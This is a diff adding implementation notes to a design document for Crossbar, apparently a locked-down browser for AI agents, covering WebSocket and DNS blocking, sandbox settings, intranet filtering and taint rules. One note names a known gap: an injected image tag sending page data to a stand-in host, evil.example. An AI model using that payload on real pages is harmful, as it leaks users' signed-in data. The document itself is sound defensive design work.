@@ -111,6 +111,17 @@ Agents get `list_activity` (read-only, own rows, no values) and `flag_domain` (m
 
 Per ADR 0001: `detect/` emits `BlockState`; the agent gets `{ state: "blocked", reason, ticket }`; tickets expire after 15 minutes. The only v1 resolver is human takeover. A verifier decides success; the person's "I'm done" triggers verification, and a failed check reopens the ticket. During takeover the agent is paused and sees nothing; the real origin is drawn outside the stream, with a warning when a password field is on a different origin from the ticket's. On hand-back the agent gets a fresh read, never a replay. Live view at 15 fps.
 
+## Implementation notes (from building v1)
+
+- **WebSockets** are invisible to CDP `Fetch` and `Network.setBlockedURLs`. A static `declarativeNetRequest` extension blocks every handshake (ADR 0010). Branded Google Chrome ignores `--load-extension`, so Crossbar runs Chromium or Chrome for Testing only.
+- **DNS**: in the browser container, Chromium runs with `--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE proxy`. It can't resolve any name except the proxy's, so there's no DNS channel around the proxy. DNS-over-HTTPS is off.
+- **Background traffic**: Chromium's own phoning home is turned off with flags and managed policy (`deploy/browser/policies.json`). One request ignores every flag tried: Chrome's AI Mode eligibility check to `www.google.com`. It carries no page data, goes through the proxy, and is turned off by policy in the container. **[test: browser/test/proxy-chrome.test.ts]**
+- **Sandbox**: Chromium's sandbox stays on. The browser container uses Docker's default seccomp profile plus `clone`, `unshare`, `setns` and `chroot` (`deploy/browser/seccomp.json`), with no capabilities and `no-new-privileges`.
+- **Intranet names**: single-label hosts (`app`, `nas`), `.local`, `.lan`, `.internal`, `.home.arpa`, `localhost` and private IP literals are blocked on the ladder before the proxy sees them; the proxy refuses private addresses after DNS as the second layer.
+- **Popups** opened by pages are closed: no tab owns them, so no policy fits. OAuth popups during takeover don't work yet.
+- **Taint scope**: taint holds top navigations and every non-GET. Subresource GETs (images, scripts) from a tainted personal tab are counted, not held. An injected `<img src="https://evil.example/?d=…">` on a signed-in page is the known gap; the personal tab only loads sites at `read_as_you` or above.
+- **Read-text overlap** is shown only for requests leaving for a domain the session hadn't used before the taint. Posting back to the same site isn't exfiltration, and showing overlap there would train people to ignore it.
+
 ## Settled decisions (11 Nov 2026)
 
 1. **Taint rule kept**: allow until tainted; after that, new domains open anonymously or ask.
